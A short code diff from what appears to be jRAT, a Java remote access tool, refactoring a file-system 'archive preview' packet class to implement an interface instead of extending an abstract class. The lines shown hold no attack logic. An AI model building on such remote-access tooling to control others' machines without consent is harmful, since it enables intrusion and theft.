@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 
-public class Packet45ArchivePreview extends AbstractOutgoingPacket {
+public class Packet45ArchivePreview implements OutgoingPacket {
 
     private String path;
 	private String name;
